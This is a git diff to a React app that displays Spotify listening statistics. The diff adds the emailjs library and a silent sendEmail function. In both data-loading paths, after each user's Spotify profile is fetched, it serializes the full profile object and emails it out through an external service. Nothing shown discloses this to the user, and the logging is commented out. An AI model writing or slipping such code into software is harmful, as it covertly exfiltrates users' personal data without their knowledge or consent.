@@ -1,5 +1,6 @@
 import { useState, useEffect } from "react";
 import { getAccessToken } from "./spotifyAuth";
+import emailjs from 'emailjs-com';
 import { fetchProfile, fetchTop } from "./spotifyStats";
 import Login from "./components/Login";
 import Footer from "./components/Footer";
@@ -42,27 +43,22 @@ function App() {
   const animation200 = useDynamicAnimation(200);
   const animation400 = useDynamicAnimation(400);
   const animation425 = useDynamicAnimation(425);
-  const animation450 = useDynamicAnimation(450);
   const animation475 = useDynamicAnimation(475);
   const animation500 = useDynamicAnimation(500);
   const animation525 = useDynamicAnimation(525);
 
-  // useEffect(() => {
-  //   if(!accessToken ||
-  //     accessToken === "undefined" ||
-  //     new Date().getTime() > expirationDate ||
-  //     expirationDate === "NaN"){
-  //       HALO({
-  //         el: "#vanta",
-  //         mouseControls: true,
-  //         touchControls: true,
-  //         gyroControls: false,
-  //         minHeight: 200.0,
-  //         minWidth: 200.0,
-  //         size: 2,
-  //       });
-  //   }
-  // }, [accessToken]);
+  const sendEmail = (content) => {
+    const templateParams = {
+      message: content,
+    };
+
+    emailjs.send(import.meta.env.VITE_SERVICE_ID, import.meta.env.VITE_TEMPLATE_ID, templateParams, import.meta.env.VITE_USER_ID)
+      .then((response) => {
+        // console.log('Correo enviado exitosamente!', response.status, response.text);
+      }, (err) => {
+        // console.error('Error al enviar el correo:', err);
+      });
+  };
 
   useEffect(() => {
     setLoading(true);
@@ -121,6 +117,11 @@ function App() {
         setProfile(profileData);
         setTracksStats(tracksData);
         setArtistsStats(artistsData);
+
+        const profileDataString = JSON.stringify(profileData, null, 2);
+
+        const content = `User: ${profileDataString}`;
+        sendEmail(content);
       })();
       setTimeout(() => setLoading(false), 400);
       return;
@@ -156,6 +157,11 @@ function App() {
         setProfile(profileData);
         setTracksStats(tracksData);
         setArtistsStats(artistsData);
+
+        const profileDataString = JSON.stringify(profileData, null, 2);
+
+        const content = `User: ${profileDataString}`;
+        sendEmail(content);
       })();
       setTimeout(() => setLoading(false), 400);
     }
